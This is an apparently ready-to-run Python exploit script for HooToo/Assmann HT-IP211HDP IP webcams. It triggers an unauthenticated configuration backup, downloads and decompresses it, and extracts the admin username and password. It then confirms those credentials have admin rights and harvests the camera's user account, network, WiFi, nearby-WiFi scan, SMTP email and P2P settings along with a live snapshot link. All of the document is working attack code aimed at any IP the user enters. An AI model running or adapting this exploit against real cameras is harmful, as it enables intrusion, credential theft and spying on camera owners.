# %%
# Exploit Title: HooToo/Assmann Webcam Admin Password Exposure
# Date: 06Apr2022 (latest update 08Jun2023)
# Exploit Author: L1-0
# Contact: github.com/L1-0
# Vendor Homepage: http://www.hootoo.com - https://www.assmann.com/
# Camera Version: HT-IP211HDP, version 2.000.022

import io
import gzip as gz
from urllib import parse
from urllib.request import urlopen, Request
import requests as rq

global userAgentString
userAgentString = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"

### Functions

class cC():
    """ consoleColor
    source: https://svn.blender.org/svnroot/bf-blender/trunk/blender/build_files/scons/tools/bcolors.py
    """
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    GRAY = '\033[90m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ENDCC = '\033[0m'
    def Disable():
        cC.HEADER = ''
        cC.OKBLUE = ''
        cC.OKCYAN = ''
        cC.OKGREEN = ''
        cC.YELLOW = ''
        cC.RED = ''
        cC.WARNING = ''
        cC.FAIL = ''
        cC.GRAY = ''
        cC.BOLD = ''
        cC.UNDERLINE = ''
        cC.ENDCC = ''

class ServerFunctions():

    exploit_works = None
    ServerResponds = True

    def __init__(self, ServerIP):
        self.ServerIP = ServerIP

    def main(self):
        if self.Exploit():
            self.GotPasswd()
        else:
            print("There still might be more info...")
        self.GetWebcamInfo()

    def GetWebcamInfo(self):
        ServerIP = self.ServerIP

        defaultTimeout = 15

        SensitiveInfo = f"http://{ServerIP}/web/cgi-bin/hi3510/param.cgi?cmd=getuser"
        NetworkInfo = f"http://{ServerIP}/web/cgi-bin/hi3510/param.cgi?cmd=getnetinfo"
        EMailInfo = f"http://{ServerIP}/web/cgi-bin/hi3510/param.cgi?cmd=getsmtp"
        WifiInfo = f"http://{ServerIP}/cgi-bin/getwifiattr.cgi"
        LocalWifiScan = f"http://{ServerIP}/cgi-bin/scanwifi.cgi?cmd=scanwifi.cgi"
        SensorInfo = f"http://{ServerIP}/cgi-bin/bconf.cgi?cmd=bconf.cgi&-action=get"
        P2PInfo = f"http://{ServerIP}/cgi-bin/p2p.cgi?cmd=p2p.cgi&-action=get"
        GetLiveSnapshot = f"http://{ServerIP}/cgi-bin/hi3510/snap.cgi"

        #
        #

        print(f"\n[{cC.GRAY}+{cC.ENDCC}] Getting stored network information...", end='\r')
        try:
            NetworkInfoGet = urlopen(Request(NetworkInfo, headers={'User-Agent': userAgentString}), timeout=defaultTimeout)
            if NetworkInfoGet.getcode() == 200:
                NetworkInfoGet = NetworkInfoGet.read().decode('utf-8').split("\n")
                NetworkInfoGet = [Entry.replace("var ", "") for Entry in NetworkInfoGet]
            try:
                print(f"Network Info [{cC.OKGREEN}Success{cC.ENDCC}]:"+" "*25)
                print(f"{cC.GRAY}---{cC.ENDCC}")
                for line in NetworkInfoGet:
                    if len(line) > 1:
                        print(line)
            except Exception as e:
                print(" Failed to collect network info!")
        except Exception as e:
            print(f"{cC.GRAY}[+] Getting local network information... failure!{cC.ENDCC}", end='\n')
            ### Reduce default timeout to 5 seconds for the rest of the requests since they are similar in nature
            defaultTimeout = 5
            self.ServerResponds = False

        #
        #
        print(f"\n[{cC.GRAY}+{cC.ENDCC}] Getting sensitive user account information", end='\r')
        try:
            SensitiveInfoGet = urlopen(Request(SensitiveInfo, headers={'User-Agent': userAgentString}), timeout=defaultTimeout)
            if SensitiveInfoGet.getcode() == 200:
                SensitiveInfoGet = SensitiveInfoGet.read().decode('utf-8').split("\n")
                SensitiveInfoGet = [Entry.replace("var ", "") for Entry in SensitiveInfoGet]
            try:
                print(f"Sensitive Info: [{cC.OKGREEN}Success{cC.ENDCC}]:"+" "*25)
                print(f"{cC.GRAY}---{cC.ENDCC}")
                for line in SensitiveInfoGet:
                    if len(line) > 1:
                        print(line)
            except Exception as e:
                print(" Failed to collect sensitive user information!")
        except Exception as e:
            print(f"{cC.GRAY}[+] Getting sensitive user information... failure!{cC.ENDCC}", end='\n')
            self.ServerResponds = False
            pass


        #
        #

        print(f"\n[{cC.GRAY}+{cC.ENDCC}] Getting WiFi information...", end='\r')
        try:
            WifiInfoGet = urlopen(Request(WifiInfo, headers={'User-Agent': userAgentString}), timeout=defaultTimeout)
            if WifiInfoGet.getcode() == 200:
                WifiInfoGet = WifiInfoGet.read().decode('utf-8').split("\n")
                WifiInfoGet = [Entry.replace("var ", "") for Entry in WifiInfoGet]
            try:
                print(f"Wifi Info [{cC.OKGREEN}Success{cC.ENDCC}]:"+" "*25)
                print(f"{cC.GRAY}---{cC.ENDCC}")
                for line in WifiInfoGet:
                    if len(line) > 1:
                        print(line)
            except Exception as e:
                print(" Failed to collect WiFi info!")
        except Exception as e:
            print(f"{cC.GRAY}[+] Getting WiFi information... failure!{cC.ENDCC}", end='\n')
            self.ServerResponds = False
            pass

        #
        #

        print(f"\n[{cC.GRAY}+{cC.ENDCC}] Scanning local WiFi...", end='\r')
        try:
            LocalWifiGet = urlopen(Request(LocalWifiScan, headers={'User-Agent': userAgentString}), timeout=defaultTimeout+5)
            if LocalWifiGet.getcode() == 200:
                LocalWifiGet = LocalWifiGet.read().decode('utf-8').split("\n")
                LocalWifiGet = [Entry.replace("var ", "") for Entry in LocalWifiGet]
            try:
                print(f"Local Wifi Info [{cC.OKGREEN}Success{cC.ENDCC}]:"+" "*25)
                print(f"{cC.GRAY}---{cC.ENDCC}")
                for line in LocalWifiGet:
                    if len(line) > 1:
                        print(line)
            except Exception as e:
                print(" Failed to collect local WiFi scan!")
        except Exception as e:
            print(f"{cC.GRAY}[+] Scanning local WiFi... failure!{cC.ENDCC}", end='\n')
            self.ServerResponds = False
            pass

        #
        #

        print(f"\n[{cC.GRAY}+{cC.ENDCC}] Getting E-Mail information...", end='\r')
        try:
            EMailInfoGet = urlopen(Request(EMailInfo, headers={'User-Agent': userAgentString}), timeout=defaultTimeout)
            if EMailInfoGet.getcode() == 200:
                EMailInfoGet = EMailInfoGet.read().decode('utf-8').split("\n")
                EMailInfoGet = [Entry.replace("var ", "") for Entry in EMailInfoGet]
            try:
                print(f"Email Info [{cC.OKGREEN}Success{cC.ENDCC}]:"+" "*25)
                print(f"{cC.GRAY}---{cC.ENDCC}")
                for line in EMailInfoGet:
                    if len(line) > 1:
                        print(line)
            except Exception as e:
                print(" Failed to collect E-Mail info!")
        except Exception as e:
            print(f"{cC.GRAY}[+] Getting E-Mail information... failure!{cC.ENDCC}", end='\n')
            self.ServerResponds = False
            pass

        #
        #

        print(f"\n[{cC.GRAY}+{cC.ENDCC}] Getting sensor information...", end='\r')
        try:
            SensorInfoGet = urlopen(Request(SensorInfo, headers={'User-Agent': userAgentString}), timeout=defaultTimeout)
            if SensorInfoGet.getcode() == 200:
                SensorInfoGet = SensorInfoGet.read().decode('utf-8').split("\n")
                SensorInfoGet = [Entry.replace("var ", "") for Entry in SensorInfoGet]
            try:
                print(f"Sensor Info [{cC.OKGREEN}Success{cC.ENDCC}]:"+" "*25)
                print(f"{cC.GRAY}---{cC.ENDCC}")
                for line in SensorInfoGet:
                    if len(line) > 1:
                        print(line)
            except Exception as e:
                print(" Failed to collect sensor info!")
        except Exception as e:
            print(f"{cC.GRAY}[+] Getting sensor information... failure!{cC.ENDCC}", end='\n')
            self.ServerResponds = False
            pass

        #
        #

        print(f"\n[{cC.GRAY}+{cC.ENDCC}] Getting P2P information...", end='\r')
        try:
            P2PInfoGet = urlopen(Request(P2PInfo, headers={'User-Agent': userAgentString}), timeout=defaultTimeout)
            if P2PInfoGet.getcode() == 200:
               P2PInfoGet = P2PInfoGet.read().decode('utf-8').split("\n")
               P2PInfoGet = [Entry.replace("var ", "") for Entry in P2PInfoGet]
            try:
                print(f"P2P Info [{cC.OKGREEN}Success{cC.ENDCC}]:"+" "*25)
                print(f"{cC.GRAY}---{cC.ENDCC}")
                for line in P2PInfoGet:
                    if len(line) > 1:
                        print(line)
            except Exception as e:
                print(" Failed to collect P2P info!")
        except Exception as e:
            print(f"{cC.GRAY}[+] Getting P2P information... failure!{cC.ENDCC}", end='\n')
            self.ServerResponds = False
            pass

        #
        #

        print(f"\n[{cC.GRAY}+{cC.ENDCC}] Creating live snapshot...", end='\r')
        try:
            Snapshot = urlopen(Request(GetLiveSnapshot, headers={'User-Agent': userAgentString}), timeout=defaultTimeout)
            if Snapshot.getcode() == 200:
                Snapshot = Snapshot.read().decode('utf-8').split("\n")
                Snap = Snapshot[0].split('=')[1]
                Snap = Snap.replace('"', '')
                Snap = "http://" + ServerIP + Snap
            try:
                print(f"Live Snapshot [{cC.OKGREEN}Success{cC.ENDCC}]:"+" "*25)
                print(f"{cC.GRAY}---{cC.ENDCC}")
                print(f"{cC.WARNING}{Snap}{cC.ENDCC}" + "\n")
            except Exception as e:
                print(" Failed to collect snapshot data!")
        except Exception as e:
            print(f"{cC.GRAY}[+] Creating live snapshot... failure!{cC.ENDCC}", end='\n')
            self.ServerResponds = False
            pass

    def GotPasswd(self):
        if self.ServerResponds:
            ServerIP = self.ServerIP
            user = self.username.replace('"', '')
            passwd = self.password.replace('"', '')
            VerifyUser = f"http://{ServerIP}/cgi-bin/hi3510/checkuser.cgi?&-name={user}&-passwd={passwd}"
            print(f"[{cC.GRAY}+{cC.ENDCC}] Checking if user and password are correct...")
            print(f"[{cC.YELLOW}+{cC.ENDCC}] --> Trying found credentials against interface: " + str(user) + ":" + str(passwd))
            VerifyResponse = urlopen(VerifyUser).read().decode('utf-8')
            VerifyResponse = VerifyResponse.replace("\n", "")
            VerifyResponse = VerifyResponse.replace("\r", "")
            VerifyResponse = VerifyResponse.replace('"', '')
            if "check=1" in VerifyResponse:
                print(f"[{cC.RED}!{cC.ENDCC}] User and password correct!")
                if "authLevel =255" in VerifyResponse:
                    print(f"[{cC.RED}!{cC.ENDCC}] User is {cC.YELLOW}admin{cC.ENDCC}!")
                    self.exploit_works = True
                    return True
            else:
                print(f"[{cC.WARNING}+{cC.ENDCC}] User and password incorrect!")
                self.exploit_works = False
                return False

    def Exploit(self):
        ServerIP = self.ServerIP

        print(f"[{cC.GRAY}+{cC.ENDCC}] Initiating exploit...")
        InitExploit = f"http://{ServerIP}/cgi-bin/hi3510/backup.cgi"
        print(f"[{cC.YELLOW}!{cC.ENDCC}] Exploit Server Response: ", end='')

        try:
            InitExploitResponse = rq.get(InitExploit).status_code
            if InitExploitResponse == 200:
                print(f"{cC.OKGREEN}200 OK{cC.ENDCC}")
                ExploitablePath = f"http://{ServerIP}/tmpfs/config_backup.bin"
                print(f"[{cC.GRAY}+{cC.ENDCC}] Downloading file...")
                backup_bin_gz = rq.get(ExploitablePath, stream=True).content # Grab compressed backup binary file
                print(f"[{cC.GRAY}+{cC.ENDCC}] Extracting user credentials...")
                backup_bin_decompressed=gz.decompress(backup_bin_gz) #Decompress backup binary
                backup_bin= io.StringIO(backup_bin_decompressed.decode('latin1')).getvalue() # Read in byte stream and decode, getvalue()-> opens content
                backup_bin = backup_bin.rstrip('\x00') # Remove zero-bytes
                user0_index = backup_bin.find("user0")
                user1_index = backup_bin.find("user1")
                user0_extracted = backup_bin[user0_index-1:user1_index-1]
                user0_extracted_List=user0_extracted.split("\n")
                user0_properties = [Entry.split("=") for Entry in user0_extracted_List][1:-1] # Split on "="
                user0_dict={}
                for Prop in user0_properties:
                    user0_dict.update({Prop[0].replace(' ', ''):Prop[1].replace(' ', '')})

                self.username = user0_dict["username"]
                self.password = user0_dict["password"]
                self.authtype = user0_dict["authtype"]
                self.authgroup = user0_dict["authgroup"]
                return True
            else:
                print(f"{InitExploitResponse}")
                return False
        except rq.exceptions.ConnectionError as Exception:
            Exception = str(Exception).split("'")[1]
            print(f"{cC.RED}ERROR{cC.ENDCC} --> {cC.WARNING}{Exception}{cC.ENDCC}")
            print(f"[{cC.YELLOW}!{cC.ENDCC}] Server does not seem to be exploitable!")
            return False

if __name__ == '__main__':

    '''
    HooToo HT-IP211HDP Webcam Exploit
    '''

    print(f"{cC.GRAY}-----{cC.ENDCC}")

    Target = input(f"Enter a ServerIP[:PORT]: {cC.OKGREEN}")
    ServerIP = parse.urlparse(Target).netloc if "http" in Target else Target

    print(f"{cC.ENDCC}Target locked: {cC.RED}{ServerIP}{cC.ENDCC}")
    print(f"{cC.GRAY}-----{cC.ENDCC}")

    Server = ServerFunctions(ServerIP)
    Server.main()
